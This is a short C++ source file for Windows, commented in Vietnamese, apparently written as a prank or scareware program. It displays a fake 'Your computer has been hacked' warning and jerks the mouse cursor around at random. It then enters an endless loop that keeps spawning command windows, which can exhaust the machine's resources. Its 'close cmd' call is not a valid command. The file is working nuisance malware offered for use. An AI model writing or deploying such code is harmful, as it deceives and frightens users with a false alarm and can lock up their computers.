#include <iostream>
#include <windows.h>
#include <ctime>
#include <cstdlib>
        // Tạo hàm tên là warning chức năng là hiển thị hộp thoại thông báo
            void waring(){
                MessageBoxW(NULL, L"Máy tính của bạn đã bị hack", L"Thông Báo", MB_OK | MB_ICONWARNING);
            }
        // Tạo hàm với chức năng di chuyển con trỏ chuột
            void fly(){
                int with = GetSystemMetrics(SM_CXSCREEN); // chiều ngang màn hình
                int height = GetSystemMetrics(SM_CYSCREEN); // chiều dọc màn hình
            // Tạo Vòng lặp vô tận
                while(true){
                    int x = std::rand() % with; // Biến x tượng trưng cho chiều ngang của màn hình
                    int y = std::rand() % height; // Biến y tượng trưng cho chiều dọc của màn hình
                    static int count = 0;
                    count++;
                    if (count >= 10) {
                        break;  // Thoát khỏi vòng lặp sau 10 lần
                    }
              // Di chuyển con trỏ chuột đến tọa độ đã đặt trước đó
                    SetCursorPos(x, y);
              // Tạm dừng trong 1 khoản thời gian
                    Sleep(1000); // 1000 có nghĩa là 1000ms ứng với 1 giây
                }
            }
             // Tạo hàm chức năng tự động mở cmd
                void open(){
                    while(true){
                    system("start cmd");
                    Sleep(1000);
                    system("close cmd");
                    }
                }
            
    int main(){
         // Khởi tạo seed cho số ngẫu nhiên
            std::srand(std::time(0));
        // Gọi hàm warning
            waring();
        // Gọi hàm fly
            fly();
        // Gọi hàm open
            open();
        return 0;
    }